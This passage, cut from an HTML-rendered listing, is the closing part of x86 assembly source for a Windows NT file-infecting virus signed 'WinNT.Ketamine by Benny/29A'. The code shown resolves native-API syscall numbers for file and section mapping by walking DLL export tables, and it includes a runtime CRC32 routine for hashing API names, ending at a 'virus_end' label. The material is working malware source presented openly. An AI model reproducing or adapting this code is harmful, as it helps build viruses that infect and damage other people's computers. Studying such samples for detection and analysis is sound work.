</span><span class="sc5">c_look</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">got_call</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">c_look</span><span class="sc0">
</span><span class="sc5">c_out</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">c_find</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">got_call</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get number of the syscall</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sys_addr</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_out</span><span class="sc0">
</span><span class="sc5">get_syscalls</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">sys_addr</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;where to save syscall numberz...</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtOF</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtQDF</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtC</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtCS</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtMVOS</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtUVOS</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;procedure for calculating CRC32s</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;at run-time</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">       
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">           
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">   
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">   
        </span><span class="sc6">lodsb</span><span class="sc0">          
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'WinNT.Ketamine by Benny/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">_Start</span></div></body>
</html>
